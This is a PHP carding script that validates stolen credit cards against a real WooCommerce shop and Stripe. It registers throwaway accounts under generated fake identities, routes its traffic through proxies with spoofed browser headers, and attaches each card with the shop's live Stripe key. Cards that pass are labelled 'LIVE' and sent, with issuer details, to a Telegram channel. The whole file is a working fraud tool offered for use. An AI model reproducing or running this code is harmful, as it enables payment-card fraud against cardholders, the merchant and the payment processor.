<?php

include 'func.php';
error_reporting(0);
set_time_limit(200);
extract($_GET);

    if(!is_dir("cookies")) mkdir("cookies");
    $cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";

    list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
    $card = "$cc|$mm|$yyyy|$cvv";
    $cy_success = "Payment method successfully added.";
    $cy_error = "Unexpected error occured!";
    $scc = implode('+', str_split($cc, 4));
    $m = ltrim($mm, "0");
    if ($m === "") {
      $m = "0";
    }
    $yyyy = strlen($yyyy) == 2 ? '20' . $yyyy : $yyyy;
    $yy = substr($yyyy, 2,2);
    $cc1 = substr($cc, 0,4);
    $cc2 = substr($cc, 4,4);
    $cc3 = substr($cc, 8,4);
    $last4 = substr($cc, 12,4);
    $bin = substr($cc, 0,6);

    $first_digit = substr($cc, 0, 1);
    switch ($first_digit) {
        case '4':
            $brand = 'VI';
            $type1 = 'visa';
            break;
        case '5':
            $brand = 'MC';
            $type1 = 'mastercard';
            break;
        case '6':
            $brand = 'AMEX';
            break;
        default:
            $brand = 'Unknown';
    }

function capture($str, $start, $end) {
    $startPos = strpos($str, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($str, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $firstname = explode(" ", $data['name'])[0];
    $lastname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = capture($randomShits, '"street2":', ',"phone"');
    $city = capture($local, '"', ',');
    $state = capture($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = capture($local, "$state" , '"');                                                             
    $zipApiUrl = 'http://ziptasticapi.com/' . $postcode;
    $stateISO = json_decode(file_get_contents($zipApiUrl))->state;

$arr = [
    'AL' => ['Alabama', 1],'AK' => ['Alaska', 2], 'AS' => ['American Samoa', 3],'AZ' => ['Arizona', 4],'AR' => ['Arkansas', 5],
    'AE' => ['Armed Forces Africa', 6],'AA' => ['Armed Forces Americas', 7], 'AE' => ['Armed Forces Canada', 8],'AE' => ['Armed Forces Europe', 9],
    'AE' => ['Armed Forces Middle East', 10],'AP' => ['Armed Forces Pacific', 11],'CA' => ['California', 12],'CO' => ['Colorado', 13],
    'CT' => ['Connecticut', 14],'DE' => ['Delaware', 15],'DC' => ['District of Columbia', 16],'FM' => ['Federated States Of Micronesia', 17],
    'FL' => ['Florida', 18],'GA' => ['Georgia', 19],'GU' => ['Guam', 20],'HI' => ['Hawaii', 21],'ID' => ['Idaho', 22],'IL' => ['Illinois', 23],
    'IN' => ['Indiana', 24],'IA' => ['Iowa', 25],'KS' => ['Kansas', 26],'KY' => ['Kentucky', 27],'LA' => ['Louisiana', 28],
    'ME' => ['Maine', 29],'MH' => ['Marshall Islands', 30],'MD' => ['Maryland', 31],'MA' => ['Massachusetts', 32],'MI' => ['Michigan', 33],
    'MN' => ['Minnesota', 34],'MS' => ['Mississippi', 35],'MO' => ['Missouri', 36],'MT' => ['Montana', 37],'NE' => ['Nebraska', 38],
    'NV' => ['Nevada', 39],'NH' => ['New Hampshire', 40],'NJ' => ['New Jersey', 41],'NM' => ['New Mexico', 42],'NY' => ['New York', 43],
    'NC' => ['North Carolina', 44],'ND' => ['North Dakota', 45],'MP' => ['Northern Mariana Islands', 46],'OH' => ['Ohio', 47],'OK' => ['Oklahoma', 48],
    'OR' => ['Oregon', 49],'PW' => ['Palau', 50],'PA' => ['Pennsylvania', 51],'PR' => ['Puerto Rico', 52],'RI' => ['Rhode Island', 53],
    'SC' => ['South Carolina', 54],'SD' => ['South Dakota', 55],'TN' => ['Tennessee', 56],'TX' => ['Texas', 57],'UT' => ['Utah', 58],
    'VT' => ['Vermont', 59],'VI' => ['Virgin Islands', 60],'VA' => ['Virginia', 61],'WA' => ['Washington', 62],'WV' => ['West Virginia', 63],
    'WI' => ['Wisconsin', 64],'WY' => ['Wyoming', 65],   
];

$state = '';

foreach ($arr as $key => $value) {
    if ($key == $stateISO) {
        $state = $value[0];
        $regionId = $value[1];
        break;
    }
}    


$count = 0;
ret:
$xemail = $_GET['xemail'] ?? '';
$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];
$maxRetries = 10;
for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
$get_url = "https://noveha.com/my-account/";

$get_headers = [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding: gzip, deflate",
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: none",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $get_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $get_headers);
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_ENCODING, "");

$get_response = curl_exec($ch);
curl_close($ch);
preg_match('/id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^"]+)"/', $get_response, $register_matchs);
$register_nonce = $register_matchs[1] ?? null;
#echo "get_response: " . $get_response . "\n";
#echo "register_nonce: " . $register_nonce . "\n";

$create_url = "https://noveha.com/my-account/?action=register";

$create_headers = [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding: gzip, deflate",
    "accept-language: en-US,en;q=0.9",
    "cache-control: max-age=0",
    "content-type: application/x-www-form-urlencoded",
    "origin: https://noveha.com",
    "priority: u=0, i",
    "referer: https://noveha.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: same-origin",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
];

$create_data = http_build_query([
    "email" => $email,
    "password" => "dgdstg3e4rt3",
    "email_2" => "",
    "wc_order_attribution_source_type" => "typein",
    "wc_order_attribution_referrer" => "(none)",
    "wc_order_attribution_utm_campaign" => "(none)",
    "wc_order_attribution_utm_source" => "(direct)",
    "wc_order_attribution_utm_medium" => "(none)",
    "wc_order_attribution_utm_content" => "(none)",
    "wc_order_attribution_utm_id" => "(none)",
    "wc_order_attribution_utm_term" => "(none)",
    "wc_order_attribution_utm_source_platform" => "(none)",
    "wc_order_attribution_utm_creative_format" => "(none)",
    "wc_order_attribution_utm_marketing_tactic" => "(none)",
    "wc_order_attribution_session_entry" => "https://noveha.com/my-account/",
    "wc_order_attribution_session_start_time" => "2025-03-09 07:38:59",
    "wc_order_attribution_session_pages" => "4",
    "wc_order_attribution_session_count" => "1",
    "wc_order_attribution_user_agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "woocommerce-register-nonce" => $register_nonce,
    "_wp_http_referer" => "/my-account/",
    "register" => "Register"
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $create_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $create_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $create_headers);
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_ENCODING, "");

$create_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
#echo "create_response: " . $create_response . "\n";
#echo "Response Code: " . $http_code . "\n";

$pay_url = "https://noveha.com/my-account/add-payment-method/";

$pay_headers = [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding: gzip, deflate, br, zstd",
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://noveha.com/my-account/payment-methods/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: same-origin",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $pay_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pay_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 

$pay_response = curl_exec($ch);
curl_close($ch);
preg_match('/"fkwcs_nonce":\s*"([^"]+)"/', $pay_response, $add_card_matches); $add_card_nonce = $add_card_matches[1] ?? null;
#echo "pay_response: " . $pay_response . "\n";
#echo "add_card_nonce: " . $add_card_nonce . "\n";

$st_url = "https://api.stripe.com/v1/payment_methods";

$st_headers = [
    "accept: application/json",
    "accept-encoding: gzip, deflate, br, zstd",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/x-www-form-urlencoded",
    "origin: https://js.stripe.com",
    "priority: u=1, i",
    "referer: https://js.stripe.com/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
];

$st_payload = http_build_query([
    "type" => "card",
    "billing_details[name]" => "aincradsaasfasdassffaystem7",
    "billing_details[email]" => "aincradsaasfasdassffaystem7@gmail.com",
    "card[number]" => $cc,
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://noveha.com",
    "key" => "pk_live_51KjKEeJbC7DQsAfmlxjOG5nBj3WCOHnXQZBohYj481mB27FLN5ITWhVuy3Y6PwRvjpiFKpIE1mhKoLtWIoirbitD00nd4pH4YP"
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $st_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $st_payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, $st_headers);
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt($ch, CURLOPT_ENCODING, ""); 

$st_response = curl_exec($ch);
curl_close($ch);
$payment_method_id = json_decode($st_response, true)['id'];
#cho "st_response: " . $st_response . "\n";
#echo "payment_method_id: " . $payment_method_id . "\n";

$cseti_url = "https://noveha.com/wp-admin/admin-ajax.php";

$cseti_headers = [
    "accept: application/json, text/javascript, */*; q=0.01",
    "accept-encoding: gzip, deflate",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "origin: https://noveha.com",
    "referer: https://noveha.com/my-account/add-payment-method/",
    "sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-origin",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "x-requested-with: XMLHttpRequest"
];

$cseti_data = http_build_query([
    "action" => "fkwcs_create_setup_intent",
    "fkwcs_nonce" => $add_card_nonce,
    "fkwcs_source" => $payment_method_id
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $cseti_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $cseti_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $cseti_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_ENCODING, ""); 
$cseti_response = curl_exec($ch);
curl_close($ch);
$seti_id = json_decode($cseti_response, true)['data']['id'];
$client_secret = json_decode($cseti_response, true)['data']['client_secret'];
#echo "cseti_response: " . $cseti_response . "\n";
#echo "seti_id: " . $seti_id . "\n";
#echo "client_secret: " . $client_secret . "\n";

$final_url = "https://api.stripe.com/v1/setup_intents/$seti_id/confirm";

$final_data = http_build_query([
    "payment_method" => $payment_method_id,
    "expected_payment_method_type" => "card",
    "use_stripe_sdk" => "true",
    "key" => "pk_live_51KjKEeJbC7DQsAfmlxjOG5nBj3WCOHnXQZBohYj481mB27FLN5ITWhVuy3Y6PwRvjpiFKpIE1mhKoLtWIoirbitD00nd4pH4YP",
    "client_secret" => $client_secret
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $final_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/x-www-form-urlencoded",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
]);

$final_response = curl_exec($ch);
curl_close($ch);
$errorMessage = json_decode($final_response, true)['error']['message'] ?? null;
$errortype = json_decode($final_response, true)['error']['type'] ?? null;
$decline_code = json_decode($final_response, true)['error']['decline_code'] ?? "UNKNOWN";
$responseData = json_decode($final_response, true);
#echo "final_response: " . $final_response . "\n";
#echo "errortype: " . $errortype . "\n";

 if ($errortype === 'invalid_request_error') {
        if ($attempt == $maxRetries) {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ Card check failed after '.$attempt.' attempts.</span><br>';
        }
        sleep(2);
        continue; 
    } else {
        if (isset($responseData['status']) && $responseData['status'] == 'succeeded') {
            echo '<span class="text text-success">Live</span> <span class="text text-success">➔ '.$card.' ➔ '.$cy_success.' R: [ '.$attempt.' ]</span><br>'; 
            $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
            "✉️ <b>CARD:</b> $card\n" .
            "🔍 <b>STATUS:</b> Payment method added\n\n" .
            "ℹ️ <b>🧾 Payment Details</b>\n" .
            "ℹ️ <b>Info:</b> $info\n" .
            "🏦 <b>Issuer:</b> $issuer\n" .
            "🌍 <b>Country:</b> $country_card\n" .
            "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
            sendToTelegram($message,$telegram);
        } elseif (isset($responseData['error']['message']) && $responseData['error']['message'] == "Your card's security code is incorrect.") {
            echo '<span class="text text-warning">Live</span> <span class="text text-warning">➔ '.$card.' ➔ incorrect_cvc R: [ '.$attempt.' ]</span><br>';              
        } else {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$errorMessage.'('.$decline_code.') R: [ '.$attempt.' ]</span><br>';
        }
        break; 
            }
}

unset($ch);
unlink($cookies);
flush();
ob_flush();
ob_end_flush();

?>